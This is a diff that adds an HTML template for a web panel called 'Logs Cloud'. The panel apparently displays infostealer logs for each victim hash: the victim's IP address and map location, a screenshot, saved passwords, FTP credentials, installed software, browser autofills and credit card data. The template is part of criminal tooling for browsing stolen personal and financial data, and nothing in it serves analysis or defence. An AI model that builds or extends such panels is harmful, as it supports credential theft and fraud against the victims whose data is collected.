@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Logs Cloud - Hash info</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/log-output.css') }}">
+</head>
+<body>
+<header>
+    <h1 class="header-title"><a href="/">Logs Cloud</a></h1>
+    <a href="/add_logs" class="add-logs">Add logs</a>
+</header>
+<main>
+    <h1 class="main-header">User: {{ data['user_hash'] }}</h1>
+    <div class="location">
+        <h2 class="location-header">Location</h2>
+        <p class="location-data">Ip: {{ data['ip'] }}</p>
+        <!-- <p class="location-data">
+            City/region/country:  data['location']['city'] }}/{ data['location']['region'] }}/{ data['location']['country'] }}</p>
+        <p class="location-data">Postal code:  data['location']['postal'] }}</p> -->
+        <p class="location-data">Lat, lng: {{ lat }}, {{ lng }}</p>
+        <a href="https://www.google.com/maps/search/{{ lat }},{{ lng }}/@{{ lat }},{{ lng }},17z" class="location-map"
+           title="Open place with Google Maps">Map</a>
+        <p class="location-data" style="font-size: 20px">The map shows the position up to the city</p>
+    </div>
+    <img src="data:;base64,{{ data['screen'] }}" alt="no screenshot" class="screenshot" title="Screenshot">
+    <div class="user-info">
+        <h3 class="user-info-header">User info:</h3>
+        <pre class="user-info-data">{{ data['user_info'] }}</pre>
+    </div>
+    <div class="passwords">
+        <h3 class="passwords-header">Passwords:</h3>
+        <pre class="passwords-data">{{ data['pwd'] }}</pre>
+    </div>
+    <div class="ftp">
+        <h3 class="ftp-header">FTP:</h3>
+        <pre class="ftp-data">{{ data['ftp'] }}</pre>
+    </div>
+    <div class="installed-software">
+        <h3 class="installed-software-header">Installed software:</h3>
+        <pre class="installed-software-data">{{ data['installed_soft'] }}</pre>
+    </div>
+    <div class="auto-fills">
+        <h3 class="auto-fills-header">Auto fills:</h3>
+        <pre class="auto-fills-data">{{ data['auto_fills'] }}</pre>
+    </div>
+    <div class="credit">
+        <h3 class="credit-header">Credit cards:</h3>
+        <pre class="credit-data">{{ data['credit_card'] }}</pre>
+    </div>
+</main>
+</body>
+</html>
